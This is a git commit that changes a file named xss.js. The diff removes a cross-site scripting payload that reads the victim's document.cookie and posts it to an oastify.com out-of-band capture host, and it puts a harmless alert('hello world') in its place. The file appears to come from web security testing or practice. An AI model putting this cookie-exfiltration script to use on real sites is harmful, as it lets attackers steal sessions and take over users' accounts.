1d541fdef439c082e5060dd72808569c8ade1c08
Jay3shh <jayesh921@gmail.com>
2023-12-25 16:18:37 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,18 +1,1 @@
-var victimCookies=document.cookie
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://fzikai1mzewznnr54uoyif0m7dd41ypn.oastify.com", true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4 && xhr.status === 200) {
-    var response = xhr.responseText;
-    console.log(response);
-    // Process the response data here
-  } else if (xhr.readyState === 4) {
-    console.log('Request failed with status code:', xhr.status);
-    // Handle any errors that occur during the request
-  }
-};
-
-var requestBody = "cookies=" + victimCookies;
-xhr.send(requestBody);
+alert("hello world")
